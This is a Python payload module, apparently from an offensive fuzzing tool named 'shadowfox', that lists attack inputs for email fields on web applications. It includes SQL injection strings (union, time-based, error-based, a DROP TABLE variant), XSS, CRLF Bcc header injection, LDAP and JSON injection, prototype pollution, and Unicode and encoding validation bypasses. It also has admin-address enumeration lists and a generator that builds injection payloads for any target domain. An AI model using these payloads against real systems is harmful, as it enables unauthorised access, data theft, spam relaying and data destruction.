# shadowfox/payloads/shadow_mail_payloads.py

EMAIL_FUZZING_PAYLOADS = {
    
    # ========== EMAIL RESTRICTION BYPASS ==========
    "email_bypass": [
        # Whitespace bypass
        "test@evil.com ",
        " test@evil.com",
        "test @evil.com",
        "test@ evil.com",
        "test@evil.com\t",
        "test@evil.com\n",
        "test@evil.com\r",
        
        # Unicode bypass
        "test@evil․com",  # U+2024
        "test@evil‍.com",  # Zero-width joiner
        "test@evil‌.com",  # Zero-width non-joiner
        "test@evil﻿.com",  # Zero-width no-break space
        "test@еvil.com",   # Cyrillic 'e'
        "test@evil。com",   # Fullwidth period
        
        # Case sensitivity bypass
        "Test@Evil.Com",
        "TEST@EVIL.COM",
        "tEsT@eViL.cOm",
        
        # Plus sign bypass
        "test+admin@evil.com",
        "test+root@evil.com",
        "test+bypass@evil.com",
        "test++@evil.com",
        "test+@evil.com",
        
        # Subdomain bypass
        "test@sub.evil.com",
        "test@www.evil.com",
        "test@mail.evil.com",
        
        # IP bypass
        "test@127.0.0.1",
        "test@192.168.1.1",
        "test@[127.0.0.1]",
        "test@[IPv6:2001:db8::1]",
        
        # Domain variations
        "test@evil.co.m",
        "test@evil.c0m",
        "test@3vil.com",
        "test@evi1.com",
        
        # Multiple @ signs
        "test@@evil.com",
        "test@test@evil.com",
        "@test@evil.com",
        "test@evil.com@",
        
        # Quoted strings
        '"test"@evil.com',
        '"test test"@evil.com',
        '"test@test"@evil.com',
        '"test.test"@evil.com',
        
        # Comment bypass
        "test(comment)@evil.com",
        "test@(comment)evil.com",
        "test@evil(comment).com",
        "(comment)test@evil.com"
    ],
    
    # ========== HTTP PARAMETER POLLUTION (HPP) ==========
    "hpp_email": [
        # Multiple email parameters
        "email=legit@good.com&email=evil@bad.com",
        "email=evil@bad.com&email=legit@good.com",
        "email[]=legit@good.com&email[]=evil@bad.com",
        "email=legit@good.com&Email=evil@bad.com",
        "email=legit@good.com&EMAIL=evil@bad.com",
        
        # Array notation
        "email[0]=legit@good.com&email[1]=evil@bad.com",
        "email['user']=legit@good.com&email['admin']=evil@bad.com",
        "user[email]=legit@good.com&admin[email]=evil@bad.com",
        
        # Nested parameters
        "user.email=legit@good.com&user.email=evil@bad.com",
        "data[user][email]=legit@good.com&data[admin][email]=evil@bad.com"
    ],
    
    # ========== JSON EMAIL ATTACKS ==========
    "json_email_injection": [
        # JSON structure manipulation
        '{"email":"legit@good.com","admin_email":"evil@bad.com"}',
        '{"email":["legit@good.com","evil@bad.com"]}',
        '{"user":{"email":"legit@good.com"},"admin":{"email":"evil@bad.com"}}',
        '{"email":"legit@good.com\",\"admin_email\":\"evil@bad.com"}',
        
        # JSON injection in email field
        '{"email":"legit@good.com\", \"role\":\"admin\", \"ignore\":\"evil@bad.com"}',
        '{"email":"legit@good.com\\n\\r\\t\", \"admin\":true, \"x\":\""}',
        
        # Unicode escapes
        '{"email":"legit@good.com\\u0022,\\u0022role\\u0022:\\u0022admin\\u0022,\\u0022x\\u0022:\\u0022"}',
        
        # Prototype pollution attempts
        '{"email":"legit@good.com","__proto__":{"admin":true}}',
        '{"email":"legit@good.com","constructor":{"prototype":{"admin":true}}}'
    ],
    
    # ========== SQL INJECTION THROUGH EMAIL ==========
    "sqli_email": [
        # Basic SQLi
        "admin@evil.com'",
        "admin@evil.com\"",
        "admin@evil.com';--",
        "admin@evil.com\";--",
        "admin@evil.com' OR '1'='1",
        "admin@evil.com\" OR \"1\"=\"1",
        
        # Union-based
        "admin@evil.com' UNION SELECT 1,2,3--",
        "admin@evil.com' UNION SELECT user(),database(),version()--",
        "admin@evil.com' UNION SELECT password FROM users--",
        
        # Time-based blind
        "admin@evil.com'; WAITFOR DELAY '0:0:5'--",
        "admin@evil.com'; SELECT pg_sleep(5)--",
        "admin@evil.com' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        
        # Boolean-based blind
        "admin@evil.com' AND 1=1--",
        "admin@evil.com' AND 1=2--",
        "admin@evil.com' AND (SELECT SUBSTRING(user(),1,1)='r')--",
        
        # Error-based
        "admin@evil.com' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "admin@evil.com' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--",
        
        # Second-order SQLi
        "admin'+union+select+1,user(),3+into+outfile+'/tmp/sqli'--@evil.com",
        "admin@evil.com'; INSERT INTO logs VALUES('SQLi executed')--"
    ],
    
    # ========== EMAIL HEADER INJECTION ==========
    "email_header_injection": [
        # CRLF injection
        "test@evil.com\r\nBcc: victim@target.com",
        "test@evil.com\nBcc: victim@target.com",
        "test@evil.com%0d%0aBcc: victim@target.com",
        "test@evil.com%0aBcc: victim@target.com",
        
        # Multiple header injection
        "test@evil.com\r\nBcc: victim@target.com\r\nSubject: Hacked",
        "test@evil.com\r\nX-Mailer: Evil\r\nBcc: admin@target.com",
        
        # Content-Type manipulation
        "test@evil.com\r\nContent-Type: text/html",
        "test@evil.com\r\nContent-Type: multipart/mixed",
        
        # MIME injection
        "test@evil.com\r\n\r\n<html><script>alert('XSS')</script></html>",
        "test@evil.com\r\n--boundary\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>"
    ],
    
    # ========== LDAP INJECTION THROUGH EMAIL ==========
    "ldap_email": [
        "admin@evil.com*",
        "admin@evil.com*)(&",
        "admin@evil.com*)(uid=*))(|(uid=*",
        "admin@evil.com*)(|(mail=*",
        "admin@evil.com*))(|(cn=*",
        "admin@evil.com*))%00",
        "*@evil.com",
        "*)@evil.com",
        "*)(mail=*)@evil.com"
    ],
    
    # ========== EMAIL ENUMERATION & TIMING ==========
    "email_enumeration": [
        # Common admin emails
        "admin@target.com",
        "administrator@target.com",
        "root@target.com",
        "postmaster@target.com",
        "webmaster@target.com",
        "support@target.com",
        "contact@target.com",
        "info@target.com",
        "sales@target.com",
        "security@target.com",
        
        # Role-based
        "ceo@target.com",
        "cto@target.com",
        "manager@target.com",
        "owner@target.com",
        
        # System accounts
        "noreply@target.com",
        "no-reply@target.com",
        "system@target.com",
        "daemon@target.com",
        "service@target.com"
    ],
    
    # ========== XSS THROUGH EMAIL ==========
    "xss_email": [
        # Basic XSS
        "<script>alert('XSS')</script>@evil.com",
        "test+<script>alert(1)</script>@evil.com",
        "\"<script>alert('XSS')</script>\"@evil.com",
        
        # Event handlers
        "test@evil.com\" onmouseover=\"alert('XSS')\"",
        "test@evil.com' onfocus='alert(1)'",
        "test@evil.com\"><img src=x onerror=alert(1)>",
        
        # HTML injection
        "test@evil.com</input><script>alert('XSS')</script>",
        "test@evil.com\"></input><script>alert(1)</script>",
        
        # JavaScript protocol
        "javascript:alert('XSS')@evil.com",
        "test@evil.com\"+location.href=\"javascript:alert(1)\"+"
    ],
    
    # ========== EMAIL LOGICAL BYPASSES ==========
    "email_logic_bypass": [
        # Empty values
        "",
        " ",
        "null",
        "undefined",
        "0",
        "false",
        
        # Non-email formats that might bypass validation
        "not-an-email",
        "just-text",
        "12345",
        "true",
        
        # Special characters
        "test@",
        "@evil.com",
        "test@@",
        "@@",
        "@",
        
        # Very long emails
        "a" * 100 + "@evil.com",
        "test@" + "a" * 100 + ".com",
        
        # International domains
        "test@münchen.de",
        "test@мой.рф",
        "test@例え.テスト",
        
        # Punycode
        "test@xn--nxasmq6b.com",
        "test@xn--fsq.com"
    ],
    
    # ========== ADVANCED EMAIL ATTACKS ==========
    "advanced_email": [
        # Email with embedded credentials
        "admin:password@evil.com",
        "user%3Apass@evil.com",
        
        # Email with port
        "test@evil.com:25",
        "test@evil.com:587",
        "test@evil.com:465",
        
        # Email with path
        "test@evil.com/path",
        "test@evil.com/admin",
        "test@evil.com?param=value",
        
        # Email with fragment
        "test@evil.com#fragment",
        "test@evil.com#admin",
        
        # Encoded emails
        "test%40evil.com",
        "test%2540evil.com",
        "test%252540evil.com",
        
        # Mixed encoding
        "te%73t@evil.com",
        "test@e%76il.com",
        "test@evil.c%6fm"
    ]
}

# Email validation bypass patterns
EMAIL_VALIDATION_BYPASS = {
    "weak_regex_bypass": [
        # Common weak regex: /.*@.*\..*/
        "a@b.c",
        ".@b.c",
        "a@.c",
        "a@b.",
        
        # Bypass /\S+@\S+\.\S+/
        "test@evil com",  # Space in domain
        "test @evil.com",  # Space before @
        "test@ evil.com",  # Space after @
    ],
    
    "length_bypass": [
        "a@b.co",  # Very short
        "x" * 320 + "@evil.com",  # RFC 5321 limit is 320 chars
        "test@" + "x" * 253 + ".com",  # Domain length limit
    ],
    
    "charset_bypass": [
        "tëst@evil.com",    # Extended ASCII
        "tést@evil.com",    # Accented characters
        "test@évil.com",    # Accented domain
        "тест@evil.com",    # Cyrillic
        "טעסט@evil.com",    # Hebrew
        "テスト@evil.com",    # Japanese
    ]
}

# Function to get payloads by category
def get_email_payloads(category: str = None, count: int = None):
    """
    Vraća email payloads po kategoriji
    
    Args:
        category: Specifična kategorija payloads
        count: Broj payloads da vrati (None za sve)
    """
    if category and category in EMAIL_FUZZING_PAYLOADS:
        payloads = EMAIL_FUZZING_PAYLOADS[category]
    else:
        # Sve kategorije
        payloads = []
        for cat_payloads in EMAIL_FUZZING_PAYLOADS.values():
            payloads.extend(cat_payloads)
    
    if count:
        return payloads[:count]
    return payloads

# Function to generate targeted email payloads
def generate_targeted_email_payloads(target_domain: str, base_email: str = "test"):
    """
    Generiše ciljane email payloads za specifičan domen
    """
    targeted = []
    
    # Domain-specific payloads
    variations = [
        f"{base_email}@{target_domain}",
        f"admin@{target_domain}",
        f"support@{target_domain}",
        f"info@{target_domain}",
        f"contact@{target_domain}",
        f"security@{target_domain}",
        f"webmaster@{target_domain}",
        f"postmaster@{target_domain}",
        f"noreply@{target_domain}",
        f"no-reply@{target_domain}",
    ]
    
    # Add bypass variations for each
    for email in variations:
        targeted.extend([
            email,
            email + " ",
            " " + email,
            email + "\t",
            email + "\n",
            email.upper(),
            email.replace("@", "@@"),
            f'"{email}"',
            email + "'",
            email + '"',
            email + "'; DROP TABLE users--",
            email + "' OR '1'='1",
            email + "\r\nBcc: victim@target.com"
        ])
    
    return targeted

if __name__ == "__main__":
    # Test payloads
    print("=== EMAIL BYPASS PAYLOADS ===")
    for payload in EMAIL_FUZZING_PAYLOADS["email_bypass"][:5]:
        print(f"'{payload}'")
    
    print("\n=== SQL INJECTION EMAIL PAYLOADS ===")
    for payload in EMAIL_FUZZING_PAYLOADS["sqli_email"][:5]:
        print(f"'{payload}'")
    
    print("\n=== TARGETED PAYLOADS FOR example.com ===")
    targeted = generate_targeted_email_payloads("example.com")
    for payload in targeted[:10]:
        print(f"'{payload}'")
